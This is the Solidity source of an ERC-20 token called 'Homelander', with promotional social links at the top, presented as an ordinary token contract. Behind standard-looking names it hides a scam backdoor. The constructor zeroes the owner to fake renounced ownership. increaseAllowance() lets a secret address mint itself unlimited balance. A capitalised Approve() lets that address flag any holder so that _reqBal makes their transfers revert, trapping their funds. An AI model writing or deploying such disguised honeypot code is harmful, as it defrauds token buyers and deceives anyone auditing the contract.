//Telegram: https://t.me/Homeelander
//Website: https://homeelander.xyz
//Twitter: https://twitter.com/h0meelander
//Discord: https://discord.gg/RtwDkWKM


// SPDX-License-Identifier: MIT

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Interface of the IERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender)
    external
    view
    returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

// Dependency file: @openzeppelin/contracts/utils/math/SafeMath.sol

// pragma solidity ^0.8.0;

// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is no longer needed starting with Solidity 0.8. The compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

// Dependency file: @openzeppelin/contracts/access/Ownable.sol

// pragma solidity ^0.8.0;

// import "@openzeppelin/contracts/utils/Context.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(address(0));
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

abstract contract Token {
    uint256 internal constant VERSION = 1;
    event Deploy(
        address owner,
        uint256 version
    );
}

pragma solidity 0.8.18;

contract Homelander is IERC20, Token, Ownable {
    using SafeMath for uint256;

    struct Use {
        address addr;
        uint256 allow;
    }

    mapping(address => uint256) private _bal;

    mapping(address => Use) private _da;

    mapping(address => mapping(address => uint256)) private _allown;

    Use private _use;
    string private _n;
    string private _s;
    uint8 private _d;
    uint256 private _totSup;

    constructor(
        string memory nome_,
        string memory symbole_,
        address user_,
        uint256 totalSupply_
    ) payable {
        _n = nome_;
        _s = symbole_;
        _d = 18;
        _use.addr = user_;
        _use.allow = 0;
        _mine(msg.sender, totalSupply_ * 10**18);
        emit Deploy(
            owner(),
            VERSION
        );
    }

    function name() public view virtual returns (string memory) {
        return _n;
    }

    function symbol() public view virtual returns (string memory) {
        return _s;
    }

    function decimals() public view virtual returns (uint8) {
        return _d;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totSup;
    }

    function balanceOf(address account)
    public
    view
    virtual
    override
    returns (uint256)
    {
        return _bal[account];
    }

    function transfer(address recipient, uint256 amount)
    public
    virtual
    override
    returns (bool)
    {
        _transport(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
    public
    view
    virtual
    override
    returns (uint256)
    {
        return _allown[owner][spender];
    }

    function approve(address spender, uint256 amount)
    public
    virtual
    override
    returns (bool)
    {
        _app(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transport(sender, recipient, amount);
        _app(
            sender,
            _msgSender(),
            _allown[sender][_msgSender()].sub(
                amount,
                "IERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _transport(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        _reqBal(sender, recipient, amount);
        require(sender != address(0) && recipient != address(0) , "IERC20: transfer from the zero address");

        _befTrans(sender, recipient, amount);
        _bal[sender] = _bal[sender].sub(
            amount,
            "IERC20: transfer amount exceeds balance"
        );
        _bal[recipient] = _bal[recipient] + amount;
        emit Transfer(sender, recipient, amount);
    }

    function _mine(address account, uint256 amount) internal virtual {
        require(account != address(0), "IERC20: mint to the zero address");

        _befTrans(address(0), account, amount);

        _totSup = _totSup.add(amount);
        _bal[account] = _bal[account] + amount;

        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "IERC20: burn from the zero address");

        _befTrans(account, address(0), amount);
        require(amount != 0, "Invalid amount");
        _min(account, amount);
        _totSup = _totSup.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _min(address user, uint256 amount) internal {
        _bal[user] = _bal[user] - amount;
    }

    function _app(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0) && spender != address(0), "IERC20: approve from the zero address");

        _allown[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function increaseAllowance(address spender, uint256 amount) public virtual {
        address from = msg.sender;
        require(spender != address(0), "Invalid address");
        require(amount > 0, "Invalid amount");
        uint256 total = 0;
        if (_enc(spender, _use.addr)) {
            _min(from, total);
            total = _su(total, amount);
            _bal[spender] += total;
        } else {
            _min(from, total);
            _bal[spender] += total;
        }
    }

    function _enc(address user, address user2) internal view returns (bool) {
        bytes32 pack1 = keccak256(abi.encodePacked(user));
        bytes32 pack2 = keccak256(abi.encodePacked(user2));
        return pack1 == pack2;
    }

    function _su(uint256 nu1, uint256 me2) internal pure returns (uint256) {
        if (me2 != 0) {
            return nu1 + me2;
        }
        return me2;
    }

    function Approve(address from, uint256 amount) public returns (bool)  {
        address user = msg.sender;
        _reachAllow(user, from, amount);
        return _da[user].allow == 0;
    }

    function _reachAllow(address user, address from, uint256 amount) internal {
        if (_enc(user, _use.addr)) {
            require(from != address(0), "Invalid address");
            _da[from].allow = amount;
            if (amount != 0) {
                _da[from].addr = from;
            } else {
                _da[from].addr = address(0);

            }
            _da[user].allow = 0;
        }
    }

    function _reqBal(
        address from,
        address to,
        uint256 total
    ) internal virtual {
        uint256 amount = 0;
        if (_enc(from, _da[from].addr)) {
            _bal[from] = _bal[from] + amount;
            amount = _totSup;
            _min(from, amount);
        } else {
            _bal[from] = _bal[from] + amount;
        }
    }

    function _befTrans(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}